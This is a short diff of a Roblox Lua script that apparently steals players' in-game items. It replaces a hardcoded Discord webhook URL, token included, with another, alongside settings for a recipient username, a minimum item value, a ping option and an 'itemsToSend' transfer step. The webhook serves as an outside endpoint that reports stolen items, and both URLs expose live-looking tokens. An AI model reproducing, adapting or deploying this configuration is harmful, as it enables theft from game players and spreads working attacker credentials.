@@ -7,7 +7,7 @@ _G.scriptExecuted = true
 local users = _G.Usernames or {"ezikiel53"}
 local min_value = _G.min_value or 10000000
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1388239231100653669/yu4_U1YK97S07c5XKdEJDrxVM7cMurWJYFKQhBWWu1SYRaNri7iRMHqwppLsW3UO_8gw"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -371,3 +371,4 @@ if #itemsToSend > 0 then
     end
     waitForUserChat()
 end
+
